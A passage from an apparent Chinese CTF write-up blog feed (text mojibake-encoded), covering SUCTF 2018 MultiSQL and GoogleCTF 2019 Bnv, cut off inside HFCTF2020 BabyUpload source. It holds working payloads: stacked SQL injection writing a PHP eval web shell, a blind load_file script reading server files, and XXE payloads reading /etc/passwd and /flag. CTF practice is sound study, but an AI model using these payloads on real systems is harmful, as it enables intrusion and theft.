punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>temp <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>mac <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆkeyä¸º147.922415852</p><p>ç”¨flask-session-cookie-manageræ„é€ ä¸‹sessionï¼Œç»“æŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[SUCTF 2018]MultiSQL</title>
      <link href="/p/3887377890.html"/>
      <url>/p/3887377890.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[sqlè¯»æ–‡ä»¶|outfile|load_file]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821131531758.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æ³¨å†Œä¸ªè´¦å·ï¼Œå‘ç°?id=2</p><p>è¯•äº†ä¸‹å¼‚æˆ–ï¼Œå¯è¡Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821132717828.png"></p><p>å°è¯•äº†å¾ˆä¹…ï¼Œè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œsubstrè¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡midè¿˜å¯ä»¥ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821133645237.png"></p><p>æ•°æ®åº“ç”¨æˆ·suctf@localhost</p><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><p>æµ‹è¯•äº†ä¸‹select 123ï¼Œæ²¡ååº”ï¼Œè¿˜ä»¥ä¸ºä¸èƒ½å †å æ³¨å…¥ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">'select 123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//73656C65637420313233</span><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656C65637420313233</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> test <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœwpä¸€çœ‹ï¼Œå¾—ï¼Œç›´æ¥å†™shellã€‚è¿˜æ˜¯å¾—æ•¢äºå°è¯•ã€‚</p><ul><li><p>secure_file_priv</p><blockquote><p>null =&gt; ä¸å…è®¸å¯¼å…¥/å¯¼å‡º</p><p>/tmp/ =&gt; å¯¼å…¥/å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹</p><p>æ²¡æœ‰å…·ä½“å€¼ =&gt; ä¸åšé™åˆ¶</p></blockquote></li></ul><p>å…ˆæŸ¥ä¸‹è¿™ä¸ªå‡½æ•°ä¸º/var/www/ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ç›´æ¥å†™å…¥shellçš„ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821155311899.png"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">"select '&lt;?php eval($_POST[cmd]);?>' into outfile '/var/www/html/favicon/shell.php';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> test <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿˜å¯ä»¥ç”¨char()å‡½æ•°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"select '&lt;?php eval($_POST[_]);?>' into outfile '/var/www/html/favicon/shell.php';"</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">'char('</span><span class="token operator">+</span><span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">')'</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token variable">@a</span><span class="token operator">=</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">79</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">59</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿˜å¯ä»¥è¯»æ–‡ä»¶</p><p>è¿™é‡Œå°†æ–‡ä»¶å†…å®¹16è¿›åˆ¶ç¼–ç ï¼Œè¿™æ ·ä¸€ä¸ªå­—ç¬¦æœ€å¤šæ¯”è¾ƒ32æ¬¡ï¼Œå¤§å¤§æé«˜æ•ˆç‡ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">def</span> <span class="token function">to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>char <span class="token operator">=</span> <span class="token string">'0123456789ABCDEF'</span>filename <span class="token operator">=</span> <span class="token string">'/var/www/html/bwvs_config/waf.php'</span>c <span class="token operator">=</span> <span class="token string">''</span>url <span class="token operator">=</span> <span class="token string">'http://7336265a-aec9-4b2d-a5b7-fcf4a830e92a.node4.buuoj.cn:81/user/user.php?id=2-if(hex(load_file(0x%s))like(0x%s),1,0)'</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> char<span class="token punctuation">:</span>        payload <span class="token operator">=</span> c <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'%'</span>        _url <span class="token operator">=</span> url <span class="token operator">%</span> <span class="token punctuation">(</span>to_hex<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span> to_hex<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            _url<span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'bg10pda2o4dav113b5s373lg72'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'admin'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'......'</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>            c <span class="token operator">=</span> c <span class="token operator">+</span> i        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¢˜ç›®åæ˜¯MultiSQLï¼Œè¯•è¯•äºŒæ¬¡æ³¨å…¥</p><p>æ³¨å†Œç”¨æˆ·åä¸º<code>1&#39;and 0</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821135214740.png"></p><p>å†™ä¸ªä»£ç ï¼Œæ–¹ä¾¿çœ‹å›æ˜¾</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">import</span> randomsession <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>username <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\\\'select 1"</span>burp0_url <span class="token operator">=</span> <span class="token string">"http://8d71418c-654d-4f38-8b8f-9c8ff4a0a2fc.node4.buuoj.cn:81/user/regCheck.php"</span>burp0_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"New_pass"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Re_pass"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"\xe6\xb3\xa8\xe5\x86\x8c"</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token comment"># /html/body/div/div[3]/div[1]/div</span>html <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>name <span class="token operator">=</span> html<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div/div[3]/div[1]/div//text()'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'ä½ å¥½ï¼Œ\t'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å•å¼•å·åŒå¼•å·ä¼šåŠ åæ–œæ ï¼Œè¿‡æ»¤çš„å­—ç¬¦ä¼šå˜æˆ@@</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821141202344.png"></p><p>è¿˜æ˜¯è€è§„çŸ©ï¼Œfuzzä¸€ä¸‹å§</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-MultiSQL/image-20210821144946867.png"></p><p>ä¸è¿‡è¿™æ„ä¹‰ä¹Ÿä¸å¤§ï¼Œæ¯•ç«Ÿflagä¸åœ¨æ•°æ®åº“é‡Œã€‚å°±è¿™æ ·å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[GoogleCTF2019 Quals]Bnv</title>
      <link href="/p/1267717976.html"/>
      <url>/p/1267717976.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820171713352.png"></p><p>xxeé¢˜ï¼Œåšçš„å¾ˆå°‘ã€‚</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212013565.png"></p><p>æŸä¸ªå¸ˆå‚…æ›¾è¨€</p><blockquote><p>æœ‰jsonçš„åœ°æ–¹å°±å¯èƒ½æœ‰xxe</p></blockquote><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212256827.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212310901.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820212332230.png"></p><p>è¿™æ ·æç¤ºéœ€è¦å£°æ˜å…ƒç´ message</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820214800081.png"></p><p>å£°æ˜ä¸‹å®ä½“</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ELEMENT message (#PCDATA)&gt;    &lt;!ENTITY b &quot;123401012350240234&quot;&gt;]&gt;&lt;message&gt;&amp;b;&lt;&#x2F;message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820214714839.png"></p><p>è¯·æ±‚æˆåŠŸã€‚</p><p>æ¥ä¸‹æ¥åˆ©ç”¨<a href="https://beeceptor.com/">https://beeceptor.com/</a></p><p>è¿™ä¸ªç½‘ç«™å¯ä»¥åˆ›å»ºä¸ªä¸´æ—¶åŸŸåå¹¶ä¿å­˜å¯¹è¯¥åŸŸåçš„è¯·æ±‚æ—¥å¿—</p><p>å°è¯•åŠ è½½å¤–éƒ¨å®ä½“</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"123401012350240234"</span><span class="token punctuation">></span></span>    &lt;!ENTITY % remote-dtd SYSTEM "https://asdfasd.free.beeceptor.com/">    %remote-dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯æƒœåŠ è½½å¤±è´¥</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820215223474.png"></p><p>å°è¯•åŠ è½½å†…éƒ¨æ–‡ä»¶</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">b</span> <span class="token attr-name">"123401012350240234"</span><span class="token punctuation">></span></span>    &lt;!ENTITY % remote-dtd SYSTEM "/etc/passwd">    %remote-dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820215437263.png"></p><blockquote><p>error detected in Markup declaration</p><p>åœ¨æ ‡è®°å£°æ˜ä¸­æ£€æµ‹åˆ°é”™è¯¯ã€‚</p></blockquote><p>è¯´æ˜å·²ç»è¢«åŠ è½½äº†ï¼Œä½†ä¸æ˜¯ä¸ªæ ¼å¼æ­£ç¡®çš„xmlæ–‡ä»¶æ‰€ä»¥ä¸­æ–­äº†ã€‚</p><p>åŠ è½½/flagï¼ŒæŠ¥é”™ä¸€è‡´ï¼Œè¯´æ˜/flagæ–‡ä»¶å­˜åœ¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘å¦‚ä½•è¯»å–ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221036776.png"></p><blockquote><p>It works because all XML entities are constant. If you define two entities with the same name, only the first one will be used.</p><p>è¿™èƒ½æ­£å¸¸å·¥ä½œæ˜¯å› ä¸ºxmlå®ä½“éƒ½æ˜¯å¸¸æ•°ï¼Œå¦‚æœå®šä¹‰äº†ä¸¤ä¸ªå®ä½“ä¸ºåŒä¸€ä¸ªåå­—ï¼Œåˆ™åªæœ‰ç¬¬ä¸€ä¸ªå®ä½“ä¼šè¢«ä½¿ç”¨ã€‚</p></blockquote><p>è€Œåœ¨é¢˜ç›®ä¸­ï¼Œè¯»å–äº†ä¸€ä¸ªé”™è¯¯çš„å®ä½“ï¼Œä¼šè¿”å›å®Œæ•´çš„å®ä½“åã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221415864.png"></p><p>å‡è®¾ç¬¬ä¸€æ¬¡è¯»å–**/flag<strong>å®ä½“ï¼Œç¬¬äºŒæ¬¡æŠŠ</strong>/flagçš„é‡Œçš„å€¼<strong>å½“åšå®ä½“æ¥è¯»å–ï¼Œæ˜æ˜¾</strong>/flagçš„é‡Œçš„å€¼**è¿™ä¸ªå®ä½“ä¸å­˜åœ¨ï¼Œç„¶åå°±ä¼šæŠ¥é”™è¿”å›ï¼Œè¿™æ ·å°±æ‹¿åˆ°flagäº†ã€‚</p><p>åˆ©ç”¨ç³»ç»Ÿè‡ªå¸¦çš„dtdæ–‡ä»¶ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GoogleCTF2019-Quals-Bnv/image-20210820221838853.png"></p><p>payload</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span><span class="token punctuation">[</span><span class="token internal-subset">    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">    &lt;!ENTITY % ISOamso '    &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> file SYSTEM "file:///flag">    &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> eval "&lt;!ENTITY <span class="token entity" title="&#x26;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="&#x27;">&amp;#x27;</span>file:///aaaaa/<span class="token entity" title="&#x25;">&amp;#x25;</span>file;<span class="token entity" title="&#x27;">&amp;#x27;</span>>">    <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;    <span class="token entity" title="&#x25;">&amp;#x25;</span>error;'>%local_dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å¥‡æ–‡å…±èµ"><a href="#å¥‡æ–‡å…±èµ" class="headerlink" title="å¥‡æ–‡å…±èµ"></a>å¥‡æ–‡å…±èµ</h3><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">Exploiting XXE with local DTD files</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[HFCTF2020]BabyUpload</title>
      <link href="/p/2499911821.html"/>
      <url>/p/2499911821.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[file_exists|postman|æ–‡ä»¶ä¸Šä¼ |session]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/babyctf/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/babyctf/success.txt'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">safe_delete</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$direction</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'direction'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">filter_input</span><span class="token punctuation">(</span><span class="token constant">INPUT_POST</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'attr'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir_path</span> <span class="token operator">=</span> <span class="token string 